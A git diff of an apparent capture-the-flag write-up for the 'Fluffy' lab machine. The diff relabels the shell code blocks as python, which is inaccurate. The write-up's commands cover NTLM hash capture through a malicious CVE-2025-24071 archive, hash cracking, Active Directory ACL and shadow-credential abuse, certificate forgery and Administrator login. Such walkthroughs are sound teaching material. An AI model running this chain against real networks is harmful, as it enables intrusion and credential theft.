@@ -27,7 +27,7 @@ Initial Access
 Provided Credentials
 The engagement starts with low-privileged access:
 
-```bash
+```python
 User: j.fleischman
 Password: J0elTHEM4n1990!
 ```
@@ -36,9 +36,10 @@ Password: J0elTHEM4n1990!
 ### SMB Enumeration
 I began by enumerating the available SMB shares using the provided credentials:
 
-```bash
+```python
 smbclient -L //10.129.31.61/ -U 'j.fleischman'
 ```
+
 ![Desktop View](/assets/fluffy/image1.png){: width="700" height="400" .normal }
 
 The IT share was accessible. After connecting, I downloaded all contents for offline review:
@@ -46,12 +47,15 @@ The IT share was accessible. After connecting, I downloaded all contents for off
 
 ![Desktop View](/assets/fluffy/image2.png){: width="700" height="400" .normal }
 
-```bash
+
+```python
+
 smbclient //10.129.31.61/IT -U 'j.fleischman'
 # Inside smbclient:
 RECURSE ON
 PROMPT OFF
 mget *
+
 ```
 
 ### Vulnerability Discovery
@@ -64,13 +68,13 @@ Among the files was a PDF document referencing
 Exploiting CVE-2025–24071
 I used a public PoC to generate a malicious archive that points to my attacker IP:
 
-```bash
+```python
 python3 poc.py --name kavi --ip 10.10.14.74
 ```
 
 I uploaded the resulting exploit.zip to the writable IT share. To capture the incoming authentication, I started Responder:
 
-```bash
+```python
 sudo responder -I tun0
 ```
 
@@ -79,17 +83,17 @@ Once a user extracted the archive, the NTLMv2 hash for p.agila was captured.
 ### Password Cracking
 The hash was cracked using rockyou.txt:
 
-```bash
+```python
 hashcat -m 5600 p_agila.hash /usr/share/wordlists/rockyou.txt
 ```
-```bash
+```python
 Credentials Found: p.agila : prometheusx-303
 ```
 ## Active Directory Enumeration
 ### BloodHound Collection
 With p.agila's credentials, I mapped the domain's attack surface:
 
-```bash
+```python
 bloodhound-python -d fluffy.htb -u p.agila -p 'prometheusx-303' -ns 10.129.31.61 -c All
 ```
 ![Desktop View](/assets/fluffy/image5.png){: width="700" height="400" .normal }
@@ -108,14 +112,14 @@ The Service Accounts group has GenericWrite over winrm_svc and ca_svc.
 ### ACL Abuse & Shadow Credentials
 I added p.agila to the Service Accounts group to inherit the necessary permissions:
 
-```bash
+```python
 bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.31.61 add groupMember "service accounts" p.agila
 ```
 ![Desktop View](/assets/fluffy/image8.png){: width="700" height="400" .normal }
 
 Next, I used a Shadow Credentials attack to take control of both service accounts:
 
-```bash
+```python
 certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
 certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
 ```
@@ -126,7 +130,7 @@ certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' 
 Using the NT hash for winrm_svc, I logged in via Evil-WinRM to collect the user flag:
 
 
-```bash
+```python
 evil-winrm -u winrm_svc -H <NT_HASH> -i 10.129.31.61
 ```
 
@@ -136,11 +140,11 @@ Enumeration revealed that the Certificate Authority (CA) was vulnerable to ESC16
 
 I abused the ca_svc account (which had write permissions on the CA) to forge a certificate for the Administrator:
 
-```bash
+```python
 # Request certificate as Administrator
 certipy-ad req -u ca_svc -hashes <HASH> -dc-ip 10.129.31.61 -ca fluffy-DC01-CA -template User
 ```
-```bash
+```python
 # Authenticate with forged PFX
 certipy-ad auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.129.31.61
 ```
@@ -148,11 +152,11 @@ certipy-ad auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.129.31.61
 ## Domain Admin Access
 The previous step returned the Administrator's NT hash. I used it for a final WinRM session:
 
-```bash
+```python
 evil-winrm -u Administrator -H <ADMIN_HASH> -i dc01.fluffy.htb
 ```
 
-```bash
+```python
 Root Flag: C:\Users\Administrator\Desktop\root.txt
 ```
 
